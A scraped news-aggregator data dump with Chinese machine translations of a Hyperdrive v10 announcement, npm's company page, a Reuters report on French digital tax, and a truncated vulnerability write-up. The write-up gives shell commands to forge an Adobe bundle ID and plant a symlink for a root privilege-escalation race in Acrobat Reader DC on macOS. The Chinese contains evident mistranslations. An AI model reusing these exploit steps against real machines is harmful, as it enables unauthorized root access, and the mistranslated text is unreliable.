Beta实际上会在后台为您安装和管理守护程序！Beaker自带创作工具，用于创建P2P网站并与他人分享。\nBeaker开发者门户包含详尽的文档和教程(提示：在Beaker中打开该网站，使教程具有交互性！)，因此您将立即上手，构建包含功能齐全的Web应用程序的超硬盘(想想个人维基、相册、博客聚合器等等)。\n您可能希望在大多数时间使用守护进程/客户端，但如果您不想使用-可能是在一次性脚本或某种嵌入式场景中-您可以将HyperDrive用作程序中的一个模块。自述文件向您展示了如何操作，您也可以在自述文件中找到完整的API文档。\n这里是一个要点，其中包含一个端到端的小示例，展示了如何使用超级暖盘来发现和同步来自另一个对等点的超级硬盘。\n在未来，我们计划制作一些关于编程使用Hyperdrive的详细教程。请记住，如果您正在寻找最简单的解决方案，请查看守护进程和/或烧杯！\n如你所见，最近发生了很多事情！但仍有更多工作要做。随着这些功能的发布，下面是我们下一步计划的草图。\n目前实施的Hypertrie&#39；s导致了重大收益。这就是说，它缺少一些您可能期望从文件系统获得的功能，最重要的是原子重命名。此外，由于Trie迭代的工作方式，符号链接和挂载的效率都略低于所需的效率。\n我们已经坐在一个新的、严重模糊的Trie实现上有一段时间了，但我们还没有集成它的周期。它通过统一的迭代器抽象(我们称之为Trie控制器)支持符号链接(直接，而不是在超级驱动层中)、挂载和原子重命名。它在各方面都要好一些。\n别担心，新的Trie将完全落后于我们现在发布的Trie。\n该守护进程提供了许多新的机会，因为它既将所有驱动器存储在磁盘上的一个位置，又在一个位置处理网络。通过全面控制存储/网络，我们可以在您的整个驱动器集合中执行优化。\n在网络方面，我们重新研究了对已由其他驱动器满足的数据块请求进行重复数据消除的方法。这里的最终目标是：即使相同的数据包含在不同的驱动器中，您也不应该下载相同的数据两次。\n在存储方面，我们正在考虑支持内容寻址的数据块存储，这意味着如果您有两个类似的驱动器，则只有一组唯一的数据块将持久保存在磁盘上--公共数据块将只存储一次。\n虽然写入器可以随心所欲地更新其驱动器(即添加新文件、删除文件、附加到文件等)，但某些操作比其他操作效率更高。不幸的是，编辑现有文件是效率低下的工作之一--它目前会导致文件复制。如果您希望在FUSE上运行数据库或将其追加到日志文件，这是个坏消息。\n更好的垃圾收集，可以轻松地从磁盘中清除旧版本的文件(对于简单情况很好，但对数据库仍然不好)。\n高效的文件更新，写入现有文件不会导致数据复制。\n我们正在为(2)探索基于inode的各种方法。就像一般的兼职作家一样，涉及到一个棘手的平衡行为。支持这些更新的索引将不可避免地增加没有随机访问修改的文件的读取延迟。如果你看的是一部大电影，从头到尾都没有修改过，这是不会有什么影响的。\n如上所述，文件更新的仅附加性质意味着我们并不完全保守地使用您的磁盘空间。HyperDrive目前不支持清除旧文件版本，但我们已经使用&#34；标签朝这个方向迈出了一步。&#34；\n使用标签，您可以为您希望保留的驱动器版本指定名称。我们将很快添加对clearUntagged方法的支持，该方法将从磁盘中删除未标记的文件版本。\n有了clearUntag，随机访问写入就变得不那么重要了，所以我们希望它能在短期内充当一个很好的权宜之计。\n坐骑目前不能相互重叠。组模型绕过了这一限制，启用了有用的多用户应用程序，但在许多情况下，您希望在多个驱动器上显示合并视图。\n为了做到这一点，我们正在考虑扩展坐骑的方法。我们上面提到的Trie控制器设计使得这里的实验变得更容易。一个简单的联合挂载功能，没有任何固执己见的冲突解决方案(即并排显示冲突文件)，是很自然的下一步。\n具有可定制的冲突解决挂钩的通用多编写器解决方案仍在我们的待办事项列表上，但这仍是一个遥远的未来功能。我们想先看看坐骑能走多远。\n在过去的一年里，为这个版本做准备是一个大团队的努力，我们非常感谢Dat社区中的许多贡献者，他们帮助测试了堆栈的alpha版本，修复了bug，并审查了文档。\n特别要感谢三星，它慷慨的三星NEXT赠款为这项工作提供了大量资金。非常感谢里卡多和三星NEXT团队的其他成员！\n要了解更多关于HyperDrive如何在幕后工作的信息，您最好的选择是查看GitHub上的源代码。我们的代码目前分散在多个repos中，大部分在Hypercore Protocol组织内。以下是我们在这篇文章中讨论的内容的几个直接链接：\n如果您对HyperDrive的设计有疑问，或者想要谈论堆栈，请给我们发不和谐的信息--这就是我们将进行面向开发的对话的地方。\n如果您遇到任何错误，请继续在我们的社区回购上打开问题。", "note_en": "For the past year, we&#39;ve been working hard on the v10 release of Hyperdrive. After a long period of beta testing, we&#39;re excited to announce that it&#39;s ready for general use!\n Hyperdrive is a peer-to-peer filesystem that&#39;s designed to help you share files quickly and safely, directly from your computer. Hyperdrive v9, along with many other modules prefixed by &#39;hyper&#39;, has served as the backbone for  Dat for many years -- you might already be familiar with Hyperdrive if you&#39;ve dug into Dat&#39;s internals.\n Leading up to this release, we&#39;ve done a bit of restructuring: Hyperdrive and its many hyper-siblings now live under a small, technically-focused brand/organization called the  Hypercore Protocol. Practically, this change means very little beyond branding, but we&#39;re hoping it will give the modules a chance to shine on their own. In light of that, here&#39;s a look inside Hyperdrive.\n In this post we&#39;ll step through some of the improvements we&#39;ve made in v10, explain how Hyperdrive fits into the broader Hypercore Protocol ecosystem, and show you how to get started using it. This release is only the beginning, and we describe our next steps in the  &#34;Looking Forward&#34; section.\n  Improved Indexing: We&#39;re using a new  HAMT-based indexing structure called a  Hypertrie, which gives huge perf/scaling boosts.\n  Hyperdrive Daemon: We&#39;ve created a cross-platform daemon that provides both FUSE and gRPC access to daemon-managed drives.\n Better Foundations: We&#39;ve recently introduced the  Hyperswarm DHT, and improvements to the  Hypercore protocol, which have helped make our whole stack snappier and more reliable.\n  Hyperdrive is a POSIX-compatible filesystem implementation, written in Node.js, that&#39;s designed to be the storage layer for fast, scalable, and secure peer-to-peer applications. For most developers, working with a Hyperdrive should feel just like using Node&#39;s standard  fs module, with only minor additions. Our main goal has always been to make it possible to share entire filesystems with others using a single 32-byte key (i.e.  hyper://ab13d...). We&#39;ll refer to Hyperdrive filesystems as &#34;drives&#34; from here on out.\n Drives are great for applications in which a single writer wants to distribute large, mutable collections of files to many readers. A file collection might be a video library, a personal blog, a scientific dataset, or what have you. Like BitTorrent, peers can download files from other peers without sacrificing trust (drive contents are signed by the original author).\n Unlike BitTorrent, files can be added or modified after a drive is created, and peers can &#34;watch&#34; a drive for updates, meaning update notifications are dispatched to readers in  realtime!\n Importantly, drives support efficient random-access file reads, meaning that you can seek through a video and it will download only the portions of the video you&#39;re viewing, on-demand. We call this property &#34;sparse downloading&#34;, and it&#39;s great for things like large websites (think all of Wikipedia mirrored to a drive) where readers only view single pages at a time.\n   Under the hood, Hyperdrive is built using two append-only log data structures called  Hypercores, one for an efficient metadata index and one for binary file content. You can learn more about Hypercore from the  Hypercore Protocol website. Hypercore gives us a fast and secure foundation for exchanging ordered blocks of data, but a good filesystem depends a good index.\n  To support performant filesystem operations, such as directory traversals, we&#39;ve layered a indexing data structure on top of Hypercore called a Hypertrie, which is an append-only implementation of a  hashed array-mapped trie. Painting a complete picture of Hypertrie is a blog post in itself, but the most important takeaway is that it lets us locate file/directory metadata, which is potentially scattered across many peers, using  O(log_4(n)) network requests, worst case. In practice, we use a specialized Hypercore extension to make this dramatically faster ( O(1) in most cases).\n  The Hypercore Protocol ecosystem has seen major improvements recently, and Hyperdrive directly benefits from all of them. Most significantly, Hyperdrive v10 leverages  Hypertrie for  better indexing, and  Hyperswarm for  better networking.\n  Hyperswarm is a Kademlia-backed DHT implementation that&#39;s designed specifically for the home. It uses a distributed approach to holepunching -- peers in the DHT can help bootstrap connections to other peers -- allowing us to traverse through the vast majority of home routers.\n Hyperswarm also comes full of heuristics designed to work around offline nodes and keep routing tables healthy. When combined with the holepunching, the heuristics make it dramatically faster to both discover and connect to peers.\n  Hyperdrive v9 used an indexing data structure that worked well for small drives, but quickly broke down as drives or directories grew large. In v10 we&#39;re using  Hypertrie. It scales nicely -- as a demo, we put a complete Wikipedia mirror (tens of millions of files, split across a few directories) into a drive, and reads remained very fast.\n We&#39;ll expand on Hypertrie in a follow-up post, but for now the main takeaway is that your directories can be as large as you (realistically) like, and file lookups will stay snappy!\n  For this release we&#39;ve focused on features that improve usability, simplify drive management, and reduce the friction of sharing. The two largest things we&#39;d like to introduce are  mounts, which let you create nested Hyperdrives, and the  Hyperdrive daemon, for serving as a one-stop shop for managing collections of drives.\n  Hypercore gives Hyperdrive many of its nice features, such as sparse downloading, for &#34;free&#34; -- the bulk of the work is handled at that layer. Hypercore, however, is fundamentally a single-writer data structure. A core&#39;s writer maintains a private key which is used to sign all appended data, making it possible for readers to exchange data amongst themselves without fear of tampering. Only letting one person (on one machine!) make changes to a drive is a big limitation, though. Not surprisingly, support for multiple writers has long been one of our most-requested features.\n In v10, we don&#39;t go all the way to a general multi-writer solution; solving multi-writer scalably, without incurring major performance penalties or confusing UX, remains a research question for us. That said, v10 introduces mounts, which are pretty much &#34;links&#34; to other Hyperdrives that look and act like normal directories.\n  Mounts open up lots of opportunities, both for more granular sharing and for fun multi-user applications. On the sharing side, you might create a  projects/ directory which contains mounts like  projects/my-module,  projects/my-website -- one drive for each thing you&#39;re working on. With mounts, you can share  my-website on its own, without giving away access to everything in  projects/. This pattern is especially handy in the daemon, which we&#39;ll talk about next.\n Things get more interesting when the drives you&#39;re mounting aren&#39;t your own. We&#39;ve had a lot of success with a &#34;groups&#34; pattern, wherein a &#34;group owner&#34; first creates a top-level group drive, then mounts &#34;user profiles&#34; within the group:\n /my-group // Owned by the group owner  (say User A )  /user-a // Owned by User A  /user-b // Owned by User B   ...\n Using this pattern, you can write simple &#34;groupware&#34; that aggregates content across users, using little more than a recursive  readdir on the group drive. For example, to find all blog posts in the group, you might search for all Markdown files in each user&#39;s  blog/ directory.\n  If you&#39;re using Hyperdrive directly, the  drive.mount(path, key, [opts]) method is what you&#39;re after. It works as you&#39;d expect from the args (mount  key at  path), and the options can include a static drive version.\n It&#39;s also easy to create mounts in the daemon through the CLI, which we&#39;ll describe next.\n  Hyperdrive is built with modular storage and networking in mind -- you can store drive contents however you like, and you can replicate them over any Node.js stream. This flexibility has benefits, but it makes it harder to get started. To that end, we&#39;ve created a cross-platform background service (a daemon) that handles storage/networking for you, while giving you a variety of ways to access daemon-managed drives.\n The daemon&#39;s a long-running service, so it can keep your drives online and available to readers. It&#39;s also great for DHT health: since the node on your computer is stable, the DHT&#39;s routing table contains fewer offline nodes. This translates to faster key lookups, meaning faster loading times.\n Most importantly, the daemon serves as a central point for exposing drives to external services -- currently we support a  gRPC API, with a corresponding  Node.js client library, and a FUSE interface.\n FUSE allows us to emulate a native filesystem directory from within our Node.js code. It lets us turn Hyperdrives into normal directories on your computer! This means that whenever the daemon is running, you&#39;ll be able to access drives directly from within the OSX Finder, say, as virtual directories inside  ~/Hyperdrive.\n With FUSE, drives are instantly accessible to other programs. You can watch movies using VLC, load PDFs using your favorite reader program, and use Unix utilities like  find and  ls to explore drives. We go into more depth in the &#34;Getting Started&#34; section below.\n  The  hyperdrive CLI tool contains a handful of commands both for interacting with FUSE, and for displaying information about drives. It also provides  import and  export commands, for those users who don&#39;t want to mess around with  ~/Hyperdrive.\n While the  ~/Hyperdrive directory was added to simplify end-user UX, the gRPC API exists for developers -- you can now program with Hyperdrive in any language, without needing to deal with tricky networking APIs. If you&#39;re using Node.js, the client library gives you a  RemoteHyperdrive interface that feels exactly like a normal drive. To get started, jump  here.\n We&#39;re hoping that the daemon provides a frictionless entry point both for end-users looking to share data, and for developers who want to build apps and services using Hyperdrive. If you have thoughts or feedback on the UX, don&#39;t hesitate to drop into our chat!\n  The best way to jump into the Hyperdrive stack is to install the daemon. This can be done through NPM:\n  Once the daemon&#39;s installed, you&#39;ll have access to the  hyperdrive CLI command. From here, you have a few options. It&#39;s best to consult the  daemon&#39;s README for a more detailed guide, but we&#39;ll highlight the key steps here.\n  Note: FUSE is currently only available on Linux and OSX. The CLI&#39;s  import and  export commands can be used to move data in/out of drives on Windows.\n Immediately after installation, you&#39;ll need to do a one-time setup step, which will request  sudo access -- don&#39;t worry, the daemon itself does not run as root. This is necessary in order to configure the bundled FUSE kernel modules:\n  After this, start the daemon normally and you&#39;ll notice that your  ~/Hyperdrive directory exist and contains a subdirectory called  Network. If you see  Network, you&#39;re good to go.\n As described in the walkthrough in the daemon README,  ~/Hyperdrive is your &#34;root drive,&#34; which you can think of as a replacement for your Home directory. You can create subdirectories like Documents, Videos, or Projects in it, as you like.\n ~/Hyperdrive/Network is a &#34;magic directory&#34; in that it does not actually exist inside of your root drive. It&#39;s there to make it easy to:\n  Details about  Network, along with explanations of all the CLI commands you can use to populate and explore your root drive, can be found in the  README.\n  If you have a daemon instance running, you can use the   hyperdrive-daemon-client module to create  RemoteHyperdrive objects. Under the hood, these will send commands over gRPC to daemon-managed drives.\n The  RemoteHyperdrive API mirrors Hyperdrive&#39;s. The following code snippet will create a client instance, use that client to create a new drive, then write a file to the drive:\n const  { HyperdriveClient  }  =  require ( &#39;hyperdrive-daemon-client&#39; )   // Auto-connects to the daemon  const client  =  new   ( )  await client . ready ( )   // Creates a new drive and writes a file  const drive  =  await client .drive . get ( )  await drive . writeFile ( &#39;foo.txt&#39; ,  &#39;bar&#39; )\n The daemon&#39;s README gives more examples. As of today, we only have a Node.js client, but the daemon&#39;s  gRPC schemas are available, and we&#39;d welcome any efforts to create clients in other languages.\n  The  Beaker Browser makes heavy use of Hyperdrive internally. Beaker 1.0 Beta, which is also being released  today, actually installs and manages the daemon for you in the background! Beaker comes packed with authoring tools for creating P2P websites and sharing them with others.\n The  Beaker developer portal contains thorough docs and tutorials (Tip: open that site in Beaker to make the tutorials interactive!), so you&#39;ll be off the ground immediately, building Hyperdrives containing fully-featured web applications (think personal wikis, photo albums, blog aggregators, and more).\n   You&#39;ll probably want to use the daemon/client most of the time, but in case you don&#39;t - perhaps in a one-off script or some kind of embedded scenario - you can use Hyperdrive as a module inside your program. The  README shows you how, and it&#39;s also where you&#39;ll find complete API docs.\n Here&#39;s a Gist containing a small, end-to-end example showing how to use Hyperswarm to discover and sync a Hyperdrive from another peer.\n In the future, we plan on making a few detailed tutorials about programmatic Hyperdrive usage. Remember, if you&#39;re looking for the simplest solution, check out the daemon and/or Beaker!\n  As you can see, a lot&#39;s been happening lately! But far more remains to be done. With these features released, here&#39;s a sketch of what we plan on tackling next.\n  The current implementation of Hypertrie&#39;s led to major gains. That said, it lacks a few features you might expect from a filesystem, most importantly atomic renames. Also, due to the way trie iteration works, both symlinks and mounts are slightly less efficient than they need to be.\n We&#39;ve been sitting on a new, heavily-fuzzed trie implementation for a while now, but we haven&#39;t had the cycles to integrate it yet. It supports symlinks (directly, as opposed to in the Hyperdrive layer), mounts, and atomic renames through a unified iterator abstraction that we&#39;re calling a &#34;trie controller&#34;. It&#39;s better all around.\n And don&#39;t worry, the new trie will be fully backwards-compat with the one we&#39;re releasing now.\n  The daemon affords us many new opportunities by virtue of its both storing all drives in one location on disk, and handling networking in one place. By having total control of storage/networking, we can perform optimizations across your entire drive collection.\n On the networking side, we&#39;re investigating methods for deduplicating block requests that have already been satisfied by other drives. The end-goal here is: &#34;you should never have to download the same data twice, even if its contained in different drives&#34;.\n On the storage side, we&#39;re considering supporting content-addressed block storage, meaning if you have two similar drives, only the set of unique blocks will be persisted on disk -- common blocks will only be stored once.\n  While a writer can update their drives however they like (i.e. adding new files, deleting files, appending to files, etc.), certain operations are more efficient than others. Unfortunately, editing existing files is one of the inefficient ones -- it currently results in file duplication. This is bad news if you want to run a database on FUSE or append to log files.\n  Better garbage collection, where old versions of files can be cleared from disk easily (fine for simple cases, but still bad for databases).\n Efficient file updates, where writing to an existing file does not lead to data copying.\n We&#39;re exploring various approaches based on  inodes for (2). As with general multiwriter, there&#39;s a tricky balancing act involved. An index that supports these updates will unavoidably increase read latencies for files that don&#39;t have random-access modifications. This won&#39;t cut it if you&#39;re watching a large movie, never modified after it was first written, from start to end.\n   As described above, the append-only nature of file updates means that we&#39;re not exactly being conservative with your disk space. Hyperdrive does not currently support clearing old file versions, but we&#39;ve taken a step in that direction with &#34;tags.&#34;\n Using tags, you can assign names to drive versions you&#39;d like to keep around. We&#39;ll shortly be adding support for a  clearUntagged method that will remove untagged file versions from disk.\n With  clearUntagged, random-access writes become less essential, so we&#39;re hoping it will serve as a nice near-term stopgap.\n  Mounts currently cannot overlap with one another. The group model works around this limitation, enabling useful multi-user applications, but there are many cases where you&#39;d like to display a &#34;merged view&#34; over many drives.\n To accomplish this, we&#39;re thinking about ways to extend mounts. The &#34;trie controller&#34; design we alluded to above makes experimentation easier here. A simple union mounts feature, without any opinionated conflict resolution (i.e. displaying conflicting files side-by-side), is a natural next step.\n A general multiwriter solution, with customizable hooks for conflict resolution, remains on our to-do list, but that&#39;s still a far-future feature. We want to see how far we can go with mounts first.\n  Gearing up for this release has been a big group effort over the past year, and we owe a lot to the many contributors in the Dat community who have helped test alpha versions of the stack, fix bugs, and review docs.\n A very special thanks goes to Samsung, whose generous  Samsung Next grant funded a massive chunk of this work. Huge thanks to Ricardo and the rest of the Samsung Next team!\n  To learn more about how Hyperdrive works under the hood, your best bet is to check out the source code on GitHub. Our code&#39;s currently split across a number of repos, most within the  Hypercore Protocol organization. Here are a few direct links to the stuff we&#39;ve discussed in this post:\n   If you have questions about Hyperdrive&#39;s design, or want to talk about the stack, message us on  Discord -- that&#39;s where we&#39;ll be having development-oriented conversations.\n If you run into any bugs, go ahead and open issues on our  Community repo.", "posttime": "2020-05-15 00:37:05", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "推出,peer,驱动器", "title": "宣布推出HyperDrive V10-一种点对点文件系统", "title_en": "Announcing Hyperdrive v10 – a peer-to-peer filesystem", "transed": 1, "url": "https://blog.hypercore-protocol.org/posts/announcing-hyperdrive-10/", "via": "", "real_tags": ["推出", "peer", "驱动器"]}, {"category": "", "categoryclass": "", "imagename": "080d5a8a5213e5420d7f821f914d60c8.png", "infoid": 1002110, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "我们是NPM，Inc.，Node Package Manager、NPM注册表和NPM CLI背后的公司。我们免费向社区提供这些工具，但我们的日常工作是为您这样的开发人员构建和销售有用的工具。\n现在就开始免费，或者升级到NPM Pro，享受高级JavaScript开发体验，包括私有软件包等功能。\nNPM受到全球1100多万开发人员的依赖，致力于使JavaScript开发变得优雅、高效和安全。免费的NPM注册中心已经成为JavaScript代码共享的中心，拥有100多万个包，是世界上最大的软件注册中心。我们的其他工具和服务使注册表和您围绕它所做的工作更上一层楼。\n成为开源JavaScript社区的贡献成员。创建公共包、发布更新、审核依赖项等。\n面向想要更多功能的下一级JavaScript开发人员。专业人员和团队增加了为您、您的团队或客户构建私人软件包的能力。\n对于非常大的团队和业务关键型项目，NPM Enterprise提供拥有数百名开发人员的组织所需的功能，如单点登录和增强的安全性。\n我们的安全团队对JavaScript漏洞和威胁的独特见解以免费和高级功能的形式提供，并为经销商和其他人提供服务。\n在NPM，Inc.，我们很自豪能派出全职员工团队来运营NPM注册表、增强CLI、提高JavaScript安全性，以及支持和培育充满活力的开源社区的其他项目。", "note_en": "We&#39;re npm, Inc., the company behind Node package manager, the npm\r Registry, and npm CLI. We offer those to the community for free, but\r our day job is building and selling useful tools for developers like you.\n    Get started today for free, or step up to npm Pro to enjoy a premium\r JavaScript development experience, with features like private packages.\n  Relied upon by more than 11 million developers worldwide, npm is committed to\r making JavaScript development elegant, productive, and safe. The free npm\r Registry has become the center of JavaScript code sharing, and with more than\r one million packages, the largest software registry in the world. Our other\r tools and services take the Registry, and the work you do around it, to the\r next level.\n  Become a contributing member of the open source JavaScript community. Create\r public packages, publish updates, audit your dependencies, and more.\n  For next-level JavaScript developers who want more capabilities. Pro and Teams\r add the ability to build private packages for you, your team, or for customers.\n  For very large teams and business-critical projects, npm Enterprise delivers\r features that organizations with hundreds of developers need, like SSO and\r enhanced security.\n  Our security team&#39;s unique insights into JavaScript vulnerabilities and threats\r are delivered as free and premium features, as well as services for resellers\r and others.\n  At npm, Inc., we&#39;re proud to dedicate teams of full-time employees to operating\r the npm Registry, enhancing the CLI, improving JavaScript security, and other\r projects that support and nurture a vibrant open source community.", "posttime": "2020-05-15 00:22:17", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "npm", "title": "NPM已停机", "title_en": "NPM Is Down", "transed": 1, "url": "https://www.npmjs.com", "via": "", "real_tags": ["npm"]}, {"category": "", "categoryclass": "", "imagename": "e23defc6e1d3be74cebe8cc3673a3096.jpeg", "infoid": 1002109, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "巴黎(路透社)-法国财政部长周四表示，无论在征税方面达成国际协议是否取得进展，法国今年都将对大型数字企业征税，并补充称，这样的税收从未像现在这样合法，也从未像现在这样有必要。\n经济合作与发展组织(OECD)的近140个国家正在就一代多以来首次重大改写税收规则进行谈判，以更好地考虑到亚马逊(Amazon)、Facebook、苹果(Apple)和谷歌(Google)等大型科技公司的崛起，这些公司经常在低税收国家录得利润。\n今年1月，巴黎方面提出，在谈判任何国际交易期间，将暂停对科技公司在法国的收入征收数字税，直到今年年底。\n然而，冠状病毒爆发的余波让各国财政部最专注于拯救本国经济，可能危及年底的最后期限。\n财政部长布鲁诺·勒梅尔(Bruno Le Maire)在电话会议上告诉记者：“数字税从未像现在这样合法和必要。”他补充说，这些公司在冠状病毒危机期间的表现比大多数公司都要好。\n“在任何情况下，法国都将适用，因为它一直表示，如果达成协议，2020年将对数字巨头征税，如果达成协议，将以国际形式征税，如果没有协议，将以国家形式征税。”\n相比之下，捷克财政部长阿莱娜·希勒罗娃(Alena Schillerova)表示，她可能会将数字税的引入推迟到明年，以利用任何国际规则，并将税率从目前提议的7%降至5%。\n法国的国家税一直是与华盛顿争执的一个来源，华盛顿认为它针对的是美国数字公司，这是不公平的。\n长期以来，欧洲一直在推动让在互联网上做生意的利润丰厚的大型科技公司在出售服务的地方纳税，而不是在所谓的“积极税收优化”下刻意选择的避税天堂。\n欧盟政界人士希望看到谷歌这样一家全球年收入超过1600亿美元的公司，在赚钱的欧洲国家缴纳更多税款，最好是统一税率。欧盟政界人士正在寻求资金，以防止气候变化，缩小欧盟27国的贫富差距。\n由于遭到科技巨头总部所在的美国的反对，全球缺乏进展，令人沮丧的是，法国等一些国家去年推出了自己的数字税。意大利、英国和西班牙也已经或计划推出自己的数字税。\n冠状病毒大流行增加了解决方案的紧迫性，它引发了全球范围的封锁和转向在家工作。这可能会增加互联网巨头的收入，但也会使欧盟各国政府更加需要现金来重启他们预计今年出现的有史以来最严重的衰退。\n由于爱尔兰和一些北欧国家的反对，过去在整个欧盟范围内创建数字税的尝试都以失败告终。在爱尔兰，许多美国大型科技公司都录得了利润。", "note_en": "PARIS (Reuters) - France will tax big digital businesses this year whether there is progress or not towards an international deal on a levy, its finance minister said on Thursday, adding such a tax had never been more legitimate or more necessary.\n  Nearly 140 countries from the Organisation for Economic Cooperation and Development (OECD) are negotiating the first major rewriting of tax rules in more than a generation, to take better account of the rise of big tech companies such as Amazon, Facebook, Apple and Google that often book profit in low-tax countries.\n Paris offered in January to suspend its digital tax on tech companies’ income in France until the end of the year while any international deal was negotiated.\n However, the fallout from the coronavirus outbreak has left finance ministries most focused on saving their economies, potentially jeopardising the end of the year deadline.\n “Never has a digital tax been more legitimate and more necessary,” Finance Minister Bruno Le Maire told journalists on a conference call, adding such companies were doing better than most during the coronavirus crisis.\n “In any case, France will apply as it has always indicated a tax on digital giants in 2020 either in an international form if there is a deal or in a national form if there is no deal.”\n In the Czech Republic by contrast, Finance Minister Alena Schillerova said she may delay the introduction of a digital tax until next year, to take advantage of any international rule, and lower the rate to 5% from a currently proposed 7%.\n France’s national tax has been a source of contention with Washington, which considers that it unfairly targets U.S. digital companies.\n  Europe has long pushed to make hugely profitable large tech companies doing business over the internet pay tax where they sell their services, rather than in tax havens deliberately chosen under what is called “aggressive tax optimisation”.\n EU politicians, seeking funds to prevent climate change and diminish wealth differences across the 27-nation bloc, want to see a company like Google, with an annual global revenue of more than $160 billion, pay more tax in the European countries where it makes money, preferably at a uniform rate.\n Frustrated with the lack of global progress because of opposition from the United States where the tech giants are based, some countries like France introduced their own digital tax last year. Italy, Britain and Spain have also either already introduced their own digital taxes or plan to do so.\n  The urgency for a solution is increased by the COVID-19 pandemic, which triggered lockdowns around the globe and a shift to working from home. This is likely to boost the revenues of internet giants but also makes EU governments even more in need of cash to restart their economies from their deepest ever recession expected this year.\n Past attempts to create an EU-wide digital tax have failed in the face of opposition from Ireland, where many big U.S. tech companies book profits, and some Nordic countries.", "posttime": "2020-05-15 00:07:43", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "交易,今年,digital,国家", "title": "法国今年将继续推进数字税，不管可能的国际交易", "title_en": "France To Go Ahead With Digital Tax This Year Regardless of Possible International Deal", "transed": 1, "url": "https://www.reuters.com/article/us-france-digital-tax/france-to-go-ahead-with-digital-tax-this-year-regardless-of-possible-international-deal-idUSKBN22Q25B", "via": "", "real_tags": ["交易", "今年", "digital", "国家"]}, {"category": "", "categoryclass": "", "imagename": "3a20791feb41759f3f28e4058962a161.png", "infoid": 1002107, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "今天，Adobe Acrobat Reader DC for MacOS修补了我报告的三个关键漏洞(CVE-2020-9615、CVE-2020-9614和CVE-2020-9613)。触发漏洞的唯一要求是已安装Adobe Acrobat Reader DC。MacOS上的普通用户(启用了SIP)可以在用户不知情的情况下本地利用此漏洞链将权限提升到根目录。在本博客中，我将分析漏洞的详细信息，并展示如何利用它们。\n根进程拥有超强的功能，它几乎可以做任何事情，读/写所有敏感的文件/数据库，如图像/日历。然而，在现代MacOS中，沙箱外的根进程很少，大多数MacOS内置服务都在沙箱中运行。他们不再是国王，他们将自己囚禁在基于声明性沙盒配置文件规则的笼子里。\n好消息是，除了MacOS内置服务之外，具有高特权服务的流行软件是新的好目标，所以Adobe Acrobat Reader DC引起了我的注意。\n/Library/PrivilegedHelperTools/中的com.adobe.ARMDC.SMJobBless Helper是Adobe Acrobat Reader DC的组件之一，负责软件更新。它以根用户和无沙箱应用的身份运行，并托管名为SMJobBlessHelper(com.adobe.ARMDC.SMJobBlessHelper).的xpc服务。大多数xPC服务在执行任何实际工作之前都会检查其连接客户机，SMJobBless Helper也是如此。\nSMJobBless Helper基于NSXPC，其客户端检查存在于[SMJobBless Helper Listener：shouldAcceptNewConnection：]中。检查逻辑如下图伪代码所示，获取客户端的PID，然后根据客户端的进程路径获取Bundle ID，如果Bundle ID为“com.adobe.ARMDC”，则客户端是可信的。\npid=[NSXPCConnection processIdentifier]；proc_pidpath(v7，proc_path，0x1000u)；bundle=[NSBundle bundleWithPath：proc_path]；bd_id=[bundle bundleIdentifier]；if(bd_id==&#34；com.adobe.ARMDC&#34；){//接受客户端的xPC连接请求}。\n苹果称它是“存储在磁盘捆绑目录中的代码和资源的表示”，所以它只是一个目录结构，包含一些定义良好的子目录/文件。包ID从目录结构的Contents/Info.plist获得。\n目录结构肯定是不可信的，我们可以通过创建特殊的捆绑包目录来伪造任何捆绑包ID。\n如下图所示，在SMJobBless Helper启动ARMDCHammer之前的更新过程中，下载文件夹(在包的父目录中)将移动到/var/Folders/ZZ/xxxxx/T/。不幸的是，在目录移动之后，“/var/folders/zz/xxxxx_n0000000000000/T/download”的所有者是根用户，普通用户无权访问它。所以这意味着我们不能再更改它及其子文件。\n如果./download/ARMDCHammer是一个符号链接，那么在移动到/var/Folders/ZZ/xxxxx/T/download之后，该符号链接是否仍然有效？\n是的，符号链接仍然有效，它可以帮助我们绕过临时目录保护。我可以强制/var/Folders/ZZ/xxxxx/T/download/ARMDCHammer链接到任何地方。\nvalidateBinary和LaunchARMHammer都使用程序路径，我们对该路径有写入权限。\n因此，如果我们可以在validateBinary之后将“/tmp/test/hello_root”替换为我们的恶意文件，则LaunchARMHammer将启动我们的恶意进程。\n你可能会认为比赛条件窗口太窄，无法控制，我稍后会展示这些技巧。\n如前所述，NSBundle不受信任，因此我们尝试伪造一个NSBundle，其包id为“com.adobe.ARMDC”。为了节省时间，我们从“/Library/Application Support/Adobe/ARMDC/Application/Adobe Acrobat Updater.app”复制了Adobe的原始捆绑包。\ncd/tmp/test/exploit echo&#34；编译SMJobBless Helper-Developit&#34；clang-framework Foundation SMJobBless Helper-Developit.m-o SMJobBless Helper-Developit echo&#34；Move SMJobBless Helper-Developit to Adobe Acrobat Updater.app&#34；mkdir&#34；Adobe Acrobat Updater.app/Contents/MacOS&#34；MV SMJobBless Helper-Developit(将SMJobBless Helper-Developit移动到Adobe Acrobat Updater.app/Contents/MacOS&#34；MV)\n现在，作为NSXPC客户端启动的SMJobBless Helper-Developit将通过[SMJobBless Helper Listener：shouldAcceptNewConnection：]的检查。\nSymlink可以帮助我们，在SMJobBless Helper移动我们的下载目录之前，我们会在我们的下载目录中创建一个符号链接。\n$cd/tmp/test$mkdir下载$ln-s/tmp/test/hello_root./download/ARMDCHammer$ls-l download/total 0 lrwxr-xr-x 1 rekken Staff 72 4 12 16：04 ARMDCHammer-&gt；/tmp/test/hello_root。\n$sudo ls-l/var/Folders/zz/xxxxx/T/下载总数0 lrwxr-xr-x 1个注册员工72 4 12 16：04 ARMDCHammer-&gt；/tmp/test/hello_root。\n(Lldb)po$RCX(&#34；--Verify&#34；，&#34；-R=标识符ARMDCHammer和锚定可信和锚定苹果通用和证书叶[subject.CN]=\\&#34；开发者ID应用程序：Adobe Systems，Inc.。(JQ525L2MZD)\\&#34；&#34；，&#34；/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/T/download/ARMDCHammer&#34；)。\n我编写了一个脚本，在整个本地磁盘中搜索ARMDCHammer，最后一无所获。但它肯定存在，不是吗？\n由于它不在本地驱动器上，因此应该已按需下载。我翻转了很多二进制文件，在Acrobat Update 